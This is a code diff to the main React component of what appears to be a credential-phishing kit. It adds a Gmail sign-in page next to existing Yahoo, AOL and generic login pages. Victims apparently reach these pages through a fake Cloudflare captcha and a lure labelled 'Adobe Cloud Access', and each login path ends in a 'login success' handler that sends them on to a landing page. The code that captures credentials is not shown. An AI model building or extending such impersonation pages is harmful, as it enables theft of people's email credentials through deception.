@@ -2,8 +2,9 @@ import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
 import YahooLoginPage from './components/YahooLoginPage';
-import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage'; // Import mobile Yahoo page
-import AolLoginPage from './components/AolLoginPage'; // 1. IMPORT AOL PAGE
+import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
+import AolLoginPage from './components/AolLoginPage';
+import GmailLoginPage from './components/GmailLoginPage'; // 1. IMPORT GMAIL PAGE
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -34,7 +35,8 @@ function App() {
   const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
   const [showYahooLogin, setShowYahooLogin] = useState(false);
-  const [showAolLogin, setShowAolLogin] = useState(false); // 2. ADD NEW STATE FOR AOL
+  const [showAolLogin, setShowAolLogin] = useState(false);
+  const [showGmailLogin, setShowGmailLogin] = useState(false); // 2. ADD NEW STATE FOR GMAIL
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -49,7 +51,8 @@ function App() {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
         setShowYahooLogin(false);
-        setShowAolLogin(false); // Reset AOL state on cookie change
+        setShowAolLogin(false);
+        setShowGmailLogin(false); // Reset Gmail state
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -109,7 +112,8 @@ function App() {
     }
     
     setShowYahooLogin(false);
-    setShowAolLogin(false); // Reset AOL state on success
+    setShowAolLogin(false);
+    setShowGmailLogin(false); // Reset Gmail state
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -121,18 +125,14 @@ function App() {
     setHasActiveSession(false);
     setCaptchaVerified(false);
     setShowYahooLogin(false);
-    setShowAolLogin(false); // Reset AOL state on logout
+    setShowAolLogin(false);
+    setShowGmailLogin(false); // Reset Gmail state
     setCurrentPage('captcha');
   };
 
-  const handleYahooSelect = () => {
-    setShowYahooLogin(true);
-  };
-
-  // 3. ADD HANDLER FUNCTION FOR AOL
-  const handleAolSelect = () => {
-    setShowAolLogin(true);
-  };
+  const handleYahooSelect = () => setShowYahooLogin(true);
+  const handleAolSelect = () => setShowAolLogin(true);
+  const handleGmailSelect = () => setShowGmailLogin(true); // 3. ADD HANDLER FOR GMAIL
 
   if (isLoading) {
     return (
@@ -152,11 +152,11 @@ function App() {
       const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
       return <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
-    
-    // Add condition for AOL
     if (showAolLogin) {
-      // AolLoginPage is responsive for desktop and mobile
       return <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+    }
+    if (showGmailLogin) {
+      return <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
@@ -164,7 +164,8 @@ function App() {
       <LoginComponent
         fileName="Adobe Cloud Access"
         onYahooSelect={handleYahooSelect}
-        onAolSelect={handleAolSelect} // 5. PASS THE NEW HANDLER AS A PROP
+        onAolSelect={handleAolSelect}
+        onGmailSelect={handleGmailSelect} // 5. PASS NEW HANDLER
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
